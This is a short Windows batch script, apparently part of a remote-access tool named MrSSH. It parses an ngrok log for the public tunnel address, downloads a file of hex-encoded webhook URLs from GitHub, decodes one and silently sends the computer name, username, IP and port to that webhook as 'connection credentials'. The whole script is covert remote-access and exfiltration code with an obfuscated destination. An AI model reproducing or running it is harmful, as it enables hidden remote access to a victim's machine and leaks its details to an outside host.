setlocal enabledelayedexpansion

set "LogFile=%temp%\Files\log\ngrok.log"
for /f "delims=" %%a in (!LogFile!) do echo %%a | findstr /c:"url=" >nul && set "Result=%%a"
for /f "tokens=8 delims==" %%a in ("!Result!") do (
    for /f "tokens=2 delims=/" %%b in ("%%a") do set RemoteURL=%%b
)

:: <Set webhook>
curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Identifiers/Redirect.ini" -o "Redirect.ini"
FOR /F "delims=" %%F IN (tokenName.txt) DO SET token=%%F
FOR /F "tokens=* USEBACKQ" %%F IN (`findstr "%token%" "redirect.ini"`) DO (SET hexwebhook=%%F)
set "hexwebhook=%hexwebhook:~-244%"
FOR /F "tokens=* USEBACKQ" %%F IN (`call hex.bat -hex "%hexwebhook%"`) DO (SET webhook=%%F)
:: </Set webhook>

Source.bat +silent --embed "Connection credentials for %computername%\%username%:" ":satellite_orbital: **IP and port:** !RemoteURL!" "FFFDBC"